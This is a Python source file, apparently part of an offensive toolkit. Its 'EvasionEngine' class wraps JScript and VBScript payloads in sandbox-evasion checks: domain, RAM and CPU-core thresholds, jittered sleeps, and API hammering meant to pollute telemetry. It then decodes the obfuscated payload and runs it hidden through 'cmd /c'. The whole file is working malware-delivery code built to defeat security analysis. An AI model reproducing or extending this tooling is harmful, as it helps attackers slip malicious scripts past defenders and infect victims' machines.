import base64
import random


class EvasionEngine:
    @staticmethod
    def wrap_jscript(payload, check_domain=False, min_ram_gb=4, min_cores=2,
                     sleep_ms=0, jitter_pct=0, api_hammering=False):
        """
        Wraps a JScript payload with sandbox evasion techniques.
        jitter_pct: randomise sleep by ±jitter_pct% of sleep_ms (beats ML)
        api_hammering: insert rapid benign API calls to pollute telemetry
        """
        encoded_payload = base64.b64encode(payload.encode()).decode()

        checks = []
        if check_domain:
            checks.append("""
                var network = new ActiveXObject("WScript.Network");
                if (network.UserDomain == network.ComputerName) { window.close(); }
            """)
        if min_ram_gb > 0:
            checks.append(f"""
                var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
                var colItems = wmi.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem", "WQL", 0x10 | 0x20);
                var enumItems = new Enumerator(colItems);
                var totalRam = 0;
                for (; !enumItems.atEnd(); enumItems.moveNext()) {{
                    var objItem = enumItems.item();
                    totalRam = objItem.TotalPhysicalMemory;
                }}
                if (totalRam < {min_ram_gb * 1024 * 1024 * 1024}) {{ window.close(); }}
            """)
        if min_cores > 0:
            checks.append(f"""
                var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
                var colItems = wmi.ExecQuery("SELECT NumberOfLogicalProcessors FROM Win32_ComputerSystem", "WQL", 0x10 | 0x20);
                var enumItems = new Enumerator(colItems);
                var cores = 0;
                for (; !enumItems.atEnd(); enumItems.moveNext()) {{
                    var objItem = enumItems.item();
                    cores = objItem.NumberOfLogicalProcessors;
                }}
                if (cores < {min_cores}) {{ window.close(); }}
            """)
        if sleep_ms > 0:
            if jitter_pct > 0:
                jitter = int(sleep_ms * jitter_pct / 100)
                actual_sleep = f"{sleep_ms} + (Math.random() * {jitter * 2} - {jitter})"
            else:
                actual_sleep = str(sleep_ms)
            checks.append(f"""
                WScript.Sleep(Math.round({actual_sleep}));
            """)
        if api_hammering:
            checks.append("""
                var _shell = new ActiveXObject("WScript.Shell");
                for (var _i=0; _i<30; _i++) {
                    _shell.ExpandEnvironmentStrings("%SYSTEMROOT%");
                    _shell.RegRead("HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ProductName");
                }
            """)

        evasion_logic = "\n".join(checks)

        script_block = f"""
            var _0x1a2b = ["{encoded_payload}", "atob", "eval"];
            {evasion_logic}
            // Execute the payload if all checks pass
            var payload = window[_0x1a2b[1]](_0x1a2b[0]);
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd /c " + payload, 0, true);
        """
        return script_block

    @staticmethod
    def wrap_vbscript(payload, check_domain=False, min_ram_gb=4, min_cores=2,
                      sleep_ms=0, jitter_pct=0, api_hammering=False):
        """
        Wraps a VBScript payload with sandbox evasion techniques.
        """
        checks = []
        if check_domain:
            checks.append("""
                Set objNetwork = CreateObject("WScript.Network")
                If objNetwork.UserDomain = objNetwork.ComputerName Then WScript.Quit
            """)

        if min_ram_gb > 0:
            checks.append(f"""
                Set objWMI = GetObject("winmgmts:\\\\.\\root\\CIMV2")
                Set colCS = objWMI.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem")
                For Each objCS In colCS
                    If objCS.TotalPhysicalMemory < {min_ram_gb * 1024 * 1024 * 1024} Then WScript.Quit
                Next
            """)

        if min_cores > 0:
            checks.append(f"""
                Set objWMI = GetObject("winmgmts:\\\\.\\root\\CIMV2")
                Set colCS = objWMI.ExecQuery("SELECT NumberOfLogicalProcessors FROM Win32_ComputerSystem")
                For Each objCS In colCS
                    If objCS.NumberOfLogicalProcessors < {min_cores} Then WScript.Quit
                Next
            """)

        if sleep_ms > 0:
            if jitter_pct > 0:
                jitter = int(sleep_ms * jitter_pct / 100)
                lo = sleep_ms - jitter
                hi = sleep_ms + jitter
                checks.append(f"""
                WScript.Sleep CLng({lo} + Rnd() * {hi - lo})
                """)
            else:
                checks.append(f"""
                WScript.Sleep {sleep_ms}
                """)

        if api_hammering:
            checks.append("""
                Dim _sh : Set _sh = CreateObject("WScript.Shell")
                Dim _i : For _i = 1 To 30
                    _sh.ExpandEnvironmentStrings("%SYSTEMROOT%")
                Next
            """)

        evasion_logic = "\n".join(checks)

        script_block = f"""
            {evasion_logic}

            ' Execution
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run "cmd /c {payload}", 0, True
        """
        return script_block
